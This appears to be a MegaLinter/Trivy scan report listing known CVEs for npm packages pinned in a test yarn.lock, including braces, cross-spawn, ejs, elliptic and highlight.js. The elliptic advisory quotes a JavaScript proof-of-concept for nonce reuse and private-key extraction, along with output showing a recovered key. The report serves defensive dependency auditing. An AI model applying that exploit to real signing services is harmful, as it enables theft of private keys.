    = braces: fails to limit the number of characters it can handle
    = The NPM package `braces`, versions prior to 3.0.3, fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends "imbalanced braces" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.

error: Package: braces
Installed Version: 3.0.2
Vulnerability CVE-2024-4068
Severity: HIGH
Fixed Version: 3.0.3
Link: [CVE-2024-4068](https://avd.aquasec.com/nvd/cve-2024-4068)
    ┌─ tests/element/yarn.lock:813:1
    │  
813 │ ╭ braces@^3.0.1, braces@~3.0.2:
814 │ │   version "3.0.2"
815 │ │   resolved "https://registry.yarnpkg.com/braces/-/braces-3.0.2.tgz#HIDDEN_BY_MEGALINTER"
816 │ │   integrity sha512-b8um+L1RzM3WDSzvhm6gIz1yfTbBt6YTlcEKAvsmqCZZFw46z626lVj9j1yEPW33H5H+lBQpZMP1k8l+78Ha0A==
817 │ │   dependencies:
818 │ │     fill-range "^7.0.1"
    │ ╰^
    │  
    = braces: fails to limit the number of characters it can handle
    = The NPM package `braces`, versions prior to 3.0.3, fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends "imbalanced braces" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.

error: Package: cross-spawn
Installed Version: 5.1.0
Vulnerability CVE-2024-21538
Severity: HIGH
Fixed Version: 7.0.5, 6.0.6
Link: [CVE-2024-21538](https://avd.aquasec.com/nvd/cve-2024-21538)
     ┌─ tests/element/yarn.lock:1415:1
     │  
1415 │ ╭ cross-spawn@^5.0.1:
1416 │ │   version "5.1.0"
1417 │ │   resolved "https://registry.yarnpkg.com/cross-spawn/-/cross-spawn-5.1.0.tgz#HIDDEN_BY_MEGALINTER"
1418 │ │   integrity sha1-6L0O/uWPz/b4+UUQoKVUu/ojVEk=
     · │
1421 │ │     shebang-command "^1.2.0"
1422 │ │     which "^1.2.9"
     │ ╰^
     │  
     = cross-spawn: regular expression denial of service
     = Versions of the package cross-spawn before 6.0.6, from 7.0.0 and before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.

error: Package: cross-spawn
Installed Version: 6.0.5
Vulnerability CVE-2024-21538
Severity: HIGH
Fixed Version: 7.0.5, 6.0.6
Link: [CVE-2024-21538](https://avd.aquasec.com/nvd/cve-2024-21538)
     ┌─ tests/element/yarn.lock:1424:1
     │  
1424 │ ╭ cross-spawn@^6.0.5:
1425 │ │   version "6.0.5"
1426 │ │   resolved "https://registry.yarnpkg.com/cross-spawn/-/cross-spawn-6.0.5.tgz#HIDDEN_BY_MEGALINTER"
1427 │ │   integrity sha512-eTVLrBSt7fjbDygz805pMnstIs2VTBNkRm0qxZd+M7A5XDdxVRWO5MxGBXZhjY4cqLYLdtrGqRf8mBPmzwSpWQ==
     · │
1432 │ │     shebang-command "^1.2.0"
1433 │ │     which "^1.2.9"
     │ ╰^
     │  
     = cross-spawn: regular expression denial of service
     = Versions of the package cross-spawn before 6.0.6, from 7.0.0 and before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.

error: Package: cross-spawn
Installed Version: 7.0.3
Vulnerability CVE-2024-21538
Severity: HIGH
Fixed Version: 7.0.5, 6.0.6
Link: [CVE-2024-21538](https://avd.aquasec.com/nvd/cve-2024-21538)
     ┌─ tests/element/yarn.lock:1435:1
     │  
1435 │ ╭ cross-spawn@^7.0.0:
1436 │ │   version "7.0.3"
1437 │ │   resolved "https://registry.yarnpkg.com/cross-spawn/-/cross-spawn-7.0.3.tgz#HIDDEN_BY_MEGALINTER"
1438 │ │   integrity sha512-iRDPJKUPVEND7dHPO8rkbOnPpyDygcDFtWjpeWNCgy8WP2rXcxXL8TskReQl6OrB2G7+UJrags1q15Fudc7G6w==
     · │
1441 │ │     shebang-command "^2.0.0"
1442 │ │     which "^2.0.1"
     │ ╰^
     │  
     = cross-spawn: regular expression denial of service
     = Versions of the package cross-spawn before 6.0.6, from 7.0.0 and before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.

note: Package: diff
Installed Version: 3.5.0
Vulnerability CVE-2026-24001
Severity: LOW
Fixed Version: 8.0.3, 5.2.2, 4.0.4, 3.5.1
Link: [CVE-2026-24001](https://avd.aquasec.com/nvd/cve-2026-24001)
     ┌─ tests/element/yarn.lock:1636:1
     │  
1636 │ ╭ diff@^3.3.0, diff@^3.3.1, diff@^3.5.0:
1637 │ │   version "3.5.0"
1638 │ │   resolved "https://registry.yarnpkg.com/diff/-/diff-3.5.0.tgz#HIDDEN_BY_MEGALINTER"
1639 │ │   integrity sha512-A46qtFgd+g7pDZinpnwiRJtxbC1hpgf0uzP3iG89scHk0AUC7A1TGxf5OiiOUv/JMZR8GOt8hL900hV0bOy5xA==
     │ ╰^
     │  
     = jsdiff: denial of service vulnerability in parsePatch and applyPatch
     = jsdiff is a JavaScript text differencing implementation. Prior to versions 8.0.3, 5.2.2, 4.0.4, and 3.5.1, attempting to parse a patch whose filename headers contain the line break characters `\r`, `\u2028`, or `\u2029` can cause the `parsePatch` method to enter an infinite loop. It then consumes memory without limit until the process crashes due to running out of memory. Applications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed). The `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected. Finally, a second and lesser interdependent bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its "leading garbage"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse. Versions 8.0.3, 5.2.2, 4.0.4, and 3.5.1 contain a fix. As a workaround, do not attempt to parse patches that contain any of these characters: `\r`, `\u2028`, or `\u2029`.

note: Package: diff
Installed Version: 4.0.2
Vulnerability CVE-2026-24001
Severity: LOW
Fixed Version: 8.0.3, 5.2.2, 4.0.4, 3.5.1
Link: [CVE-2026-24001](https://avd.aquasec.com/nvd/cve-2026-24001)
     ┌─ tests/element/yarn.lock:1641:1
     │  
1641 │ ╭ diff@^4.0.1:
1642 │ │   version "4.0.2"
1643 │ │   resolved "https://registry.yarnpkg.com/diff/-/diff-4.0.2.tgz#HIDDEN_BY_MEGALINTER"
1644 │ │   integrity sha512-58lmxKSA4BNyLz+HHMUzlOEpg09FV+ev6ZMe3vJihgdxzgcwZ8VoEEPmALCZG9LmqfVoNMMKpttIYTVG6uDY7A==
     │ ╰^
     │  
     = jsdiff: denial of service vulnerability in parsePatch and applyPatch
     = jsdiff is a JavaScript text differencing implementation. Prior to versions 8.0.3, 5.2.2, 4.0.4, and 3.5.1, attempting to parse a patch whose filename headers contain the line break characters `\r`, `\u2028`, or `\u2029` can cause the `parsePatch` method to enter an infinite loop. It then consumes memory without limit until the process crashes due to running out of memory. Applications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed). The `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected. Finally, a second and lesser interdependent bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its "leading garbage"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse. Versions 8.0.3, 5.2.2, 4.0.4, and 3.5.1 contain a fix. As a workaround, do not attempt to parse patches that contain any of these characters: `\r`, `\u2028`, or `\u2029`.

error: Package: ejs
Installed Version: 2.7.4
Vulnerability CVE-2022-29078
Severity: CRITICAL
Fixed Version: 3.1.7
Link: [CVE-2022-29078](https://avd.aquasec.com/nvd/cve-2022-29078)
     ┌─ tests/element/yarn.lock:1716:1
     │  
1716 │ ╭ ejs@^2.5.9, ejs@^2.6.1:
1717 │ │   version "2.7.4"
1718 │ │   resolved "https://registry.yarnpkg.com/ejs/-/ejs-2.7.4.tgz#HIDDEN_BY_MEGALINTER"
1719 │ │   integrity sha512-7vmuyh5+kuUyJKePhQfRQBhXV5Ce+RnaeeQArKu1EAMpL3WbgMt5WG6uQZpEVvYSSsxMXRKOewtDk9RaTKXRlA==
     │ ╰^
     │  
     = ejs: server-side template injection in outputFunctionName
     = The ejs (aka Embedded JavaScript templates) package 3.1.6 for Node.js allows server-side template injection in settings[view options][outputFunctionName]. This is parsed as an internal option, and overwrites the outputFunctionName option with an arbitrary OS command (which is executed upon template compilation).

warning: Package: ejs
Installed Version: 2.7.4
Vulnerability CVE-2024-33883
Severity: MEDIUM
Fixed Version: 3.1.10
Link: [CVE-2024-33883](https://avd.aquasec.com/nvd/cve-2024-33883)
     ┌─ tests/element/yarn.lock:1716:1
     │  
1716 │ ╭ ejs@^2.5.9, ejs@^2.6.1:
1717 │ │   version "2.7.4"
1718 │ │   resolved "https://registry.yarnpkg.com/ejs/-/ejs-2.7.4.tgz#HIDDEN_BY_MEGALINTER"
1719 │ │   integrity sha512-7vmuyh5+kuUyJKePhQfRQBhXV5Ce+RnaeeQArKu1EAMpL3WbgMt5WG6uQZpEVvYSSsxMXRKOewtDk9RaTKXRlA==
     │ ╰^
     │  
     = The ejs (aka Embedded JavaScript templates) package before 3.1.10 for  ...
     = The ejs (aka Embedded JavaScript templates) package before 3.1.10 for Node.js lacks certain pollution protection.

error: Package: ejs
Installed Version: 3.1.6
Vulnerability CVE-2022-29078
Severity: CRITICAL
Fixed Version: 3.1.7
Link: [CVE-2022-29078](https://avd.aquasec.com/nvd/cve-2022-29078)
     ┌─ tests/element/yarn.lock:1721:1
     │  
1721 │ ╭ ejs@^3.1.5:
1722 │ │   version "3.1.6"
1723 │ │   resolved "https://registry.yarnpkg.com/ejs/-/ejs-3.1.6.tgz#HIDDEN_BY_MEGALINTER"
1724 │ │   integrity sha512-9lt9Zse4hPucPkoP7FHDF0LQAlGyF9JVpnClFLFH3aSSbxmyoqINRpp/9wePWJTUl4KOQwRL72Iw3InHPDkoGw==
1725 │ │   dependencies:
1726 │ │     jake "^10.6.1"
     │ ╰^
     │  
     = ejs: server-side template injection in outputFunctionName
     = The ejs (aka Embedded JavaScript templates) package 3.1.6 for Node.js allows server-side template injection in settings[view options][outputFunctionName]. This is parsed as an internal option, and overwrites the outputFunctionName option with an arbitrary OS command (which is executed upon template compilation).

warning: Package: ejs
Installed Version: 3.1.6
Vulnerability CVE-2024-33883
Severity: MEDIUM
Fixed Version: 3.1.10
Link: [CVE-2024-33883](https://avd.aquasec.com/nvd/cve-2024-33883)
     ┌─ tests/element/yarn.lock:1721:1
     │  
1721 │ ╭ ejs@^3.1.5:
1722 │ │   version "3.1.6"
1723 │ │   resolved "https://registry.yarnpkg.com/ejs/-/ejs-3.1.6.tgz#HIDDEN_BY_MEGALINTER"
1724 │ │   integrity sha512-9lt9Zse4hPucPkoP7FHDF0LQAlGyF9JVpnClFLFH3aSSbxmyoqINRpp/9wePWJTUl4KOQwRL72Iw3InHPDkoGw==
1725 │ │   dependencies:
1726 │ │     jake "^10.6.1"
     │ ╰^
     │  
     = The ejs (aka Embedded JavaScript templates) package before 3.1.10 for  ...
     = The ejs (aka Embedded JavaScript templates) package before 3.1.10 for Node.js lacks certain pollution protection.

error: Package: elliptic
Installed Version: 6.5.4
Vulnerability GHSA-vjh7-7g9h-fjfh
Severity: CRITICAL
Fixed Version: 6.6.1
Link: [GHSA-vjh7-7g9h-fjfh](https://github.com/advisories/GHSA-vjh7-7g9h-fjfh)
     ┌─ tests/element/yarn.lock:1728:1
     │  
1728 │ ╭ elliptic@^6.5.3:
1729 │ │   version "6.5.4"
1730 │ │   resolved "https://registry.yarnpkg.com/elliptic/-/elliptic-6.5.4.tgz#HIDDEN_BY_MEGALINTER"
1731 │ │   integrity sha512-iLhC6ULemrljPZb+QutR5TQGB+pdW6KGD5RSegS+8sorOZT+rdQFbsQFJgvN3eRqNALqJer4oQ16YvJHlU8hzQ==
     · │
1738 │ │     minimalistic-assert "^1.0.1"
1739 │ │     minimalistic-crypto-utils "^1.0.1"
     │ ╰^
     │  
     = Elliptic's private key extraction in ECDSA upon signing a malformed input (e.g. a string)
     = ### Summary
       
       Private key can be extracted from ECDSA signature upon signing a malformed input (e.g. a string or a number), which could e.g. come from JSON network input
       
       Note that `elliptic` by design accepts hex strings as one of the possible input types
       
       ### Details
       
       In this code: https://github.com/indutny/elliptic/blob/3e46a48fdd2ef2f89593e5e058d85530578c9761/lib/elliptic/ec/index.js#L100-L107
       
       `msg` is a BN instance after conversion, but `nonce` is an array, and different BN instances could generate equivalent arrays after conversion.
       
       Meaning that a same `nonce` could be generated for different messages used in signing process, leading to `k` reuse, leading to private key extraction from a pair of signatures
       
       Such a message can be constructed for any already known message/signature pair, meaning that the attack needs only a single malicious message being signed for a full key extraction
       
       While signing unverified attacker-controlled messages would be problematic itself (and exploitation of this needs such a scenario), signing a single message still _should not_ leak the private key
       
       Also, message validation could have the same bug (out of scope for this report, but could be possible in some situations), which makes this attack more likely when used in a chain
       
       ### PoC
       
       #### `k` reuse example
       
       ```js
       import elliptic from 'elliptic'
       
       const { ec: EC } = elliptic
       
       const privateKey = crypto.getRandomValues(new Uint8Array(32))
       const curve = 'ed25519' // or any other curve, e.g. secp256k1
       const ec = new EC(curve)
       const prettyprint = ({ r, s }) => `r: ${r}, s: ${s}`
       const sig0 = prettyprint(ec.sign(Buffer.alloc(32, 1), privateKey)) // array of ones
       const sig1 = prettyprint(ec.sign('01'.repeat(32), privateKey)) // same message in hex form
       const sig2 = prettyprint(ec.sign('-' + '01'.repeat(32), privateKey)) // same `r`, different `s`
       console.log({ sig0, sig1, sig2 })
       ```
       
       #### Full attack
       
       This doesn't include code for generation/recovery on a purpose (bit it's rather trivial)
       
       ```js
       import elliptic from 'elliptic'
       
       const { ec: EC } = elliptic
       
       const privateKey = crypto.getRandomValues(new Uint8Array(32))
       const curve = 'secp256k1' // or any other curve, e.g. ed25519
       const ec = new EC(curve)
       
       // Any message, e.g. previously known signature
       const msg0 = crypto.getRandomValues(new Uint8Array(32))
       const sig0 = ec.sign(msg0, privateKey)
       
       // Attack
       const msg1 = funny(msg0) // this is a string here, but can also be of other non-Uint8Array types
       const sig1 = ec.sign(msg1, privateKey)
       
       const something = extract(msg0, sig0, sig1, curve)
       
       console.log('Curve:', curve)
       console.log('Typeof:', typeof msg1)
       console.log('Keys equal?', Buffer.from(privateKey).toString('hex') === something)
       const rnd = crypto.getRandomValues(new Uint8Array(32))
       const st = (x) => JSON.stringify(x)
       console.log('Keys equivalent?', st(ec.sign(rnd, something).toDER()) === st(ec.sign(rnd, privateKey).toDER()))
       console.log('Orig key:', Buffer.from(privateKey).toString('hex'))
       console.log('Restored:', something)
       ```
       
       Output:
       ```console
       Curve: secp256k1
       Typeof: string
       Keys equal? true
       Keys equivalent? true
       Orig key: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a
       Restored: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a
       ```
       
       Similar for `ed25519`, but due to low `n`, the key might not match precisely but is nevertheless equivalent for signing:
       ```console
       Curve: ed25519
       Typeof: string
       Keys equal? false
       Keys equivalent? true
       Orig key: f1ce0e4395592f4de24f6423099e022925ad5d2d7039b614aaffdbb194a0d189
       Restored: 01ce0e4395592f4de24f6423099e0227ec9cb921e3b7858581ec0d26223966a6
       ```
       `restored` is equal to `orig` mod `N`.
       
       ### Impact
       
       Full private key extraction when signing a single malicious message (that passes `JSON.stringify`/`JSON.parse`)

note: Package: elliptic
Installed Version: 6.5.4
Vulnerability CVE-2024-42459
Severity: LOW
Fixed Version: 6.5.7
Link: [CVE-2024-42459](https://avd.aquasec.com/nvd/cve-2024-42459)
     ┌─ tests/element/yarn.lock:1728:1
     │  
1728 │ ╭ elliptic@^6.5.3:
1729 │ │   version "6.5.4"
1730 │ │   resolved "https://registry.yarnpkg.com/elliptic/-/elliptic-6.5.4.tgz#HIDDEN_BY_MEGALINTER"
1731 │ │   integrity sha512-iLhC6ULemrljPZb+QutR5TQGB+pdW6KGD5RSegS+8sorOZT+rdQFbsQFJgvN3eRqNALqJer4oQ16YvJHlU8hzQ==
     · │
1738 │ │     minimalistic-assert "^1.0.1"
1739 │ │     minimalistic-crypto-utils "^1.0.1"
     │ ╰^
     │  
     = elliptic: nodejs/elliptic: EDDSA signature malleability due to missing signature length check
     = In the Elliptic package 6.5.6 for Node.js, EDDSA signature malleability occurs because there is a missing signature length check, and thus zero-valued bytes can be removed or appended.

note: Package: elliptic
Installed Version: 6.5.4
Vulnerability CVE-2024-42460
Severity: LOW
Fixed Version: 6.5.7
Link: [CVE-2024-42460](https://avd.aquasec.com/nvd/cve-2024-42460)
     ┌─ tests/element/yarn.lock:1728:1
     │  
1728 │ ╭ elliptic@^6.5.3:
1729 │ │   version "6.5.4"
1730 │ │   resolved "https://registry.yarnpkg.com/elliptic/-/elliptic-6.5.4.tgz#HIDDEN_BY_MEGALINTER"
1731 │ │   integrity sha512-iLhC6ULemrljPZb+QutR5TQGB+pdW6KGD5RSegS+8sorOZT+rdQFbsQFJgvN3eRqNALqJer4oQ16YvJHlU8hzQ==
     · │
1738 │ │     minimalistic-assert "^1.0.1"
1739 │ │     minimalistic-crypto-utils "^1.0.1"
     │ ╰^
     │  
     = elliptic: nodejs/elliptic: ECDSA signature malleability due to missing checks
     = In the Elliptic package 6.5.6 for Node.js, ECDSA signature malleability occurs because there is a missing check for whether the leading bit of r and s is zero.

note: Package: elliptic
Installed Version: 6.5.4
Vulnerability CVE-2024-42461
Severity: LOW
Fixed Version: 6.5.7
Link: [CVE-2024-42461](https://avd.aquasec.com/nvd/cve-2024-42461)
     ┌─ tests/element/yarn.lock:1728:1
     │  
1728 │ ╭ elliptic@^6.5.3:
1729 │ │   version "6.5.4"
1730 │ │   resolved "https://registry.yarnpkg.com/elliptic/-/elliptic-6.5.4.tgz#HIDDEN_BY_MEGALINTER"
1731 │ │   integrity sha512-iLhC6ULemrljPZb+QutR5TQGB+pdW6KGD5RSegS+8sorOZT+rdQFbsQFJgvN3eRqNALqJer4oQ16YvJHlU8hzQ==
     · │
1738 │ │     minimalistic-assert "^1.0.1"
1739 │ │     minimalistic-crypto-utils "^1.0.1"
     │ ╰^
     │  
     = elliptic: nodejs/elliptic: ECDSA implementation malleability due to BER-enconded signatures being allowed
     = In the Elliptic package 6.5.6 for Node.js, ECDSA signature malleability occurs because BER-encoded signatures are allowed.

note: Package: elliptic
Installed Version: 6.5.4
Vulnerability CVE-2024-48948
Severity: LOW
Fixed Version: 6.6.0
Link: [CVE-2024-48948](https://avd.aquasec.com/nvd/cve-2024-48948)
     ┌─ tests/element/yarn.lock:1728:1
     │  
1728 │ ╭ elliptic@^6.5.3:
1729 │ │   version "6.5.4"
1730 │ │   resolved "https://registry.yarnpkg.com/elliptic/-/elliptic-6.5.4.tgz#HIDDEN_BY_MEGALINTER"
1731 │ │   integrity sha512-iLhC6ULemrljPZb+QutR5TQGB+pdW6KGD5RSegS+8sorOZT+rdQFbsQFJgvN3eRqNALqJer4oQ16YvJHlU8hzQ==
     · │
1738 │ │     minimalistic-assert "^1.0.1"
1739 │ │     minimalistic-crypto-utils "^1.0.1"
     │ ╰^
     │  
     = elliptic: ECDSA signature verification error may reject legitimate transactions
     = The Elliptic package 6.5.7 for Node.js, in its for ECDSA implementation, does not correctly verify valid signatures if the hash contains at least four leading 0 bytes and when the order of the elliptic curve's base point is smaller than the hash, because of an _truncateToN anomaly. This leads to valid signatures being rejected. Legitimate transactions or communications may be incorrectly flagged as invalid.

note: Package: elliptic
Installed Version: 6.5.4
Vulnerability CVE-2024-48949
Severity: LOW
Fixed Version: 6.5.6
Link: [CVE-2024-48949](https://avd.aquasec.com/nvd/cve-2024-48949)
     ┌─ tests/element/yarn.lock:1728:1
     │  
1728 │ ╭ elliptic@^6.5.3:
1729 │ │   version "6.5.4"
1730 │ │   resolved "https://registry.yarnpkg.com/elliptic/-/elliptic-6.5.4.tgz#HIDDEN_BY_MEGALINTER"
1731 │ │   integrity sha512-iLhC6ULemrljPZb+QutR5TQGB+pdW6KGD5RSegS+8sorOZT+rdQFbsQFJgvN3eRqNALqJer4oQ16YvJHlU8hzQ==
     · │
1738 │ │     minimalistic-assert "^1.0.1"
1739 │ │     minimalistic-crypto-utils "^1.0.1"
     │ ╰^
     │  
     = elliptic: Missing Validation in Elliptic's EDDSA Signature Verification
     = The verify function in lib/elliptic/eddsa/index.js in the Elliptic package before 6.5.6 for Node.js omits "sig.S().gte(sig.eddsa.curve.n) || sig.S().isNeg()" validation.

note: Package: elliptic
Installed Version: 6.5.4
Vulnerability CVE-2025-14505
Severity: LOW
Fixed Version: 
Link: [CVE-2025-14505](https://avd.aquasec.com/nvd/cve-2025-14505)
     ┌─ tests/element/yarn.lock:1728:1
     │  
1728 │ ╭ elliptic@^6.5.3:
1729 │ │   version "6.5.4"
1730 │ │   resolved "https://registry.yarnpkg.com/elliptic/-/elliptic-6.5.4.tgz#HIDDEN_BY_MEGALINTER"
1731 │ │   integrity sha512-iLhC6ULemrljPZb+QutR5TQGB+pdW6KGD5RSegS+8sorOZT+rdQFbsQFJgvN3eRqNALqJer4oQ16YvJHlU8hzQ==
     · │
1738 │ │     minimalistic-assert "^1.0.1"
1739 │ │     minimalistic-crypto-utils "^1.0.1"
     │ ╰^
     │  
     = elliptic: Key handling flaws in Elliptic
     = The ECDSA implementation of the Elliptic package generates incorrect signatures if an interim value of 'k' (as computed based on step 3.2 of  RFC 6979 https://datatracker.ietf.org/doc/html/rfc6979 ) has leading zeros and is susceptible to cryptanalysis, which can lead to secret key exposure. This happens, because the byte-length of 'k' is incorrectly computed, resulting in its getting truncated during the computation. Legitimate transactions or communications will be broken as a result. Furthermore, due to the nature of the fault, attackers could–under certain conditions–derive the secret key, if they could get their hands on both a faulty signature generated by a vulnerable version of Elliptic and a correct signature for the same inputs.
       
       This issue affects all known versions of Elliptic (at the time of writing, versions less than or equal to 6.6.1).

note: Package: elliptic
Installed Version: 6.6.1
Vulnerability CVE-2025-14505
Severity: LOW
Fixed Version: 
Link: [CVE-2025-14505](https://avd.aquasec.com/nvd/cve-2025-14505)
     ┌─ tests/element/yarn.lock:1741:1
     │  
1741 │ ╭ elliptic@^6.6.1:
1742 │ │   version "6.6.1"
1743 │ │   resolved "https://registry.yarnpkg.com/elliptic/-/elliptic-6.6.1.tgz#HIDDEN_BY_MEGALINTER"
1744 │ │   integrity sha512-RaddvvMatK2LJHqFJ+YA4WysVN5Ita9E35botqIYspQ4TkRAlCicdzKOjlyv/1Za5RyTNn7di//eEV0uTAfe3g==
     · │
1751 │ │     minimalistic-assert "^1.0.1"
1752 │ │     minimalistic-crypto-utils "^1.0.1"
     │ ╰^
     │  
     = elliptic: Key handling flaws in Elliptic
     = The ECDSA implementation of the Elliptic package generates incorrect signatures if an interim value of 'k' (as computed based on step 3.2 of  RFC 6979 https://datatracker.ietf.org/doc/html/rfc6979 ) has leading zeros and is susceptible to cryptanalysis, which can lead to secret key exposure. This happens, because the byte-length of 'k' is incorrectly computed, resulting in its getting truncated during the computation. Legitimate transactions or communications will be broken as a result. Furthermore, due to the nature of the fault, attackers could–under certain conditions–derive the secret key, if they could get their hands on both a faulty signature generated by a vulnerable version of Elliptic and a correct signature for the same inputs.
       
       This issue affects all known versions of Elliptic (at the time of writing, versions less than or equal to 6.6.1).

error: Package: faker
Installed Version: 6.6.6
Vulnerability GHSA-5w9c-rv96-fr7g
Severity: HIGH
Fixed Version: 
Link: [GHSA-5w9c-rv96-fr7g](https://github.com/advisories/GHSA-5w9c-rv96-fr7g)
     ┌─ tests/element/yarn.lock:2039:1
     │  
2039 │ ╭ faker@*:
2040 │ │   version "6.6.6"
2041 │ │   resolved "https://registry.yarnpkg.com/faker/-/faker-6.6.6.tgz#HIDDEN_BY_MEGALINTER"
2042 │ │   integrity sha512-9tCqYEDHI5RYFQigXFwF1hnCwcWCOJl/hmll0lr5D2Ljjb0o4wphb69wikeJDz5qCEzXCoPvG6ss5SDP6IfOdg==
     │ ╰^
     │  
     = Removal of functional code in faker.js
     = Faker.js helps users create large amounts of data for testing and development. The maintainer deliberately removed the functional code from this package. This appears to be a purposeful and successful attempt to make the package unusable. This is related to the colors.js [CVE-2021-23567](https://github.com/advisories/GHSA-gh88-3pxp-6fm8). 
       
       The functional code for this package was forked and can be found [here](https://github.com/faker-js/faker). 

warning: Package: got
Installed Version: 6.7.1
Vulnerability CVE-2022-33987
Severity: MEDIUM
Fixed Version: 12.1.0, 11.8.5
Link: [CVE-2022-33987](https://avd.aquasec.com/nvd/cve-2022-33987)
     ┌─ tests/element/yarn.lock:2434:1
     │  
2434 │ ╭ got@^6.2.0:
2435 │ │   version "6.7.1"
2436 │ │   resolved "https://registry.yarnpkg.com/got/-/got-6.7.1.tgz#HIDDEN_BY_MEGALINTER"
2437 │ │   integrity sha1-JAzQV4WpoY5WHcG0S0HHY+8ejbA=
     · │
2448 │ │     unzip-response "^2.0.1"
2449 │ │     url-parse-lax "^1.0.0"
     │ ╰^
     │  
     = nodejs-got: missing verification of requested URLs allows redirects to UNIX sockets
     = The got package before 12.1.0 (also fixed in 11.8.5) for Node.js allows a redirect to a UNIX socket.

warning: Package: got
Installed Version: 7.1.0
Vulnerability CVE-2022-33987
Severity: MEDIUM
Fixed Version: 12.1.0, 11.8.5
Link: [CVE-2022-33987](https://avd.aquasec.com/nvd/cve-2022-33987)
     ┌─ tests/element/yarn.lock:2451:1
     │  
2451 │ ╭ got@^7.0.0:
2452 │ │   version "7.1.0"
2453 │ │   resolved "https://registry.yarnpkg.com/got/-/got-7.1.0.tgz#HIDDEN_BY_MEGALINTER"
2454 │ │   integrity sha512-Y5WMo7xKKq1muPsxD+KmrR8DH5auG7fBdDVueZwETwV6VytKyU9OX/ddpq2/1hp1vIPvVb4T81dKQz3BivkNLw==
     · │
2468 │ │     url-parse-lax "^1.0.0"
2469 │ │     url-to-options "^1.0.1"
     │ ╰^
     │  
     = nodejs-got: missing verification of requested URLs allows redirects to UNIX sockets
     = The got package before 12.1.0 (also fixed in 11.8.5) for Node.js allows a redirect to a UNIX socket.

warning: Package: highlight.js
Installed Version: 9.18.5
Vulnerability GHSA-7wwv-vh3v-89cq
Severity: MEDIUM
Fixed Version: 10.4.1
Link: [GHSA-7wwv-vh3v-89cq](https://github.com/advisories/GHSA-7wwv-vh3v-89cq)
     ┌─ tests/element/yarn.lock:2632:1
     │  
2632 │ ╭ highlight.js@^9.17.1:
2633 │ │   version "9.18.5"
2634 │ │   resolved "https://registry.yarnpkg.com/highlight.js/-/highlight.js-9.18.5.tgz#HIDDEN_BY_MEGALINTER"
2635 │ │   integrity sha512-a5bFyofd/BHCX52/8i8uJkjr9DYwXIPnM/plwI6W7ezItLGqzt7X2G2nXuYSfsIJdkwwj/g9DG1LkcGJI/dDoA==
     │ ╰^
     │  
     = ReDOS vulnerabities: multiple grammars
     = ### Impact: Potential ReDOS vulnerabilities (exponential and polynomial RegEx backtracking)
       
       [oswasp](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS): 
       
       > The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time.
       
       If are you are using Highlight.js to highlight user-provided data you are possibly vulnerable.  On the client-side (in a browser or Electron environment) risks could include lengthy freezes or crashes... On the server-side infinite freezes could occur... effectively preventing users from accessing your app or service (ie, Denial of Service).
       
       This is an issue with grammars shipped with the parser (and potentially 3rd party grammars also), not the parser itself. If you are using Highlight.js with any of the following grammars you are vulnerable.  If you are using `highlightAuto` to detect the language (and have any of these grammars registered) you are vulnerable. Exponential grammars (C, Perl, JavaScript) are auto-registered when using the common grammar subset/library `require('highlight.js/lib/common')` as of 10.4.0 - see https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.4.0/build/highlight.js
       
       All versions prior to 10.4.1 are vulnerable, including version 9.18.5. 
       
       **Grammars with exponential backtracking issues:**
       
         - c-like (c, cpp, arduino)
         - handlebars (htmlbars)
         - gams
         - perl
         - jboss-cli
         - r
         - erlang-repl
         - powershell
         - routeros
         - livescript (10.4.0 and 9.18.5 included this fix)
         - javascript & typescript (10.4.0 included partial fixes)
       
       And of course any aliases of those languages have the same issue. ie: `hpp` is no safer than `cpp`.
       
       **Grammars with polynomial backtracking issues:**
       
       - kotlin
       - gcode
       - d
       - aspectj
       - moonscript
       - coffeescript/livescript
       - csharp
       - scilab
       - crystal
       - elixir
       - basic
       - ebnf
       - ruby
       - fortran/irpf90
       - livecodeserver
       - yaml
       - x86asm
       - dsconfig
       - markdown
       - ruleslanguage
       - xquery
       - sqf
       
       And again: any aliases of those languages have the same issue. ie: `ruby` and `rb` share the same ruby issues.
       
       
       ### Patches
       
       - Version 10.4.1 resolves these vulnerabilities.  Please upgrade.
       
       ### Workarounds / Mitigations
       
